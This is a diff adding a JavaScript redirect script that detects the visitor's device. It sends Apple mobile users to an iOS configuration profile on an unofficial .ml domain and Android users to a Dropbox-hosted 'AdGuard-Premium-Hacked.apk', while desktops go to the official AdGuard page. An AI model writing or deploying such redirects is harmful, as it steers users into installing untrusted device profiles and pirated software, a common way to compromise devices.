@@ -1,0 +1,46 @@
+if(navigator.vendor != null && navigator.vendor.match(/Apple Computer, Inc./) && navigator.userAgent.match(/iPhone/i) || (navigator.userAgent.match(/iPod/i))) 
+
+    {
+
+        //alert("Ваше устройство:  iPhone или  iPod");
+        window.location.href = "https://signernwotb.ml/iadsios#.mobileconfig";
+
+    }
+
+else if (navigator.vendor != null && navigator.vendor.match(/Apple Computer, Inc./) && navigator.userAgent.match(/iPad/i))  
+
+    {
+
+        //alert("Ваше устройство:  iPad");
+        window.location.href = "https://signernwotb.ml/iadsios#.mobileconfig";
+
+    }
+
+else if (navigator.vendor != null && navigator.vendor.match(/Apple Computer, Inc./) && navigator.userAgent.indexOf('Safari') != -1)
+
+    {
+
+        //alert("Ваше устройство:  Mac OS");
+        window.location.href = "https://adguard.com/ru/download.html#mobileconfig";
+
+    }
+
+else if (navigator.vendor == null || navigator.vendor != null)
+
+    {
+
+        //alert("Ваше устройство не от компании Apple");
+        function detect() {
+          var isMobile = window.orientation > -1;
+	  var gettext = isMobile ? 'Mobile' : 'PC';
+	  if (gettext == 'Mobile') { 
+		//alert('Ваше устройство: 🤖 Android или прочие устройства');
+                window.location.href = "https://www.dl.dropboxusercontent.com/s/t9semv6sa14kyd0/AdGuard-Premium-Hacked.apk#mobileconfig";
+          } else { 
+		//alert('Ваше устройство: 🪟 Windows или 🐧 Linux');
+                window.location.href = "https://adguard.com/ru/download.html#mobileconfig";
+          };
+        }
+        detect()
+
+    }
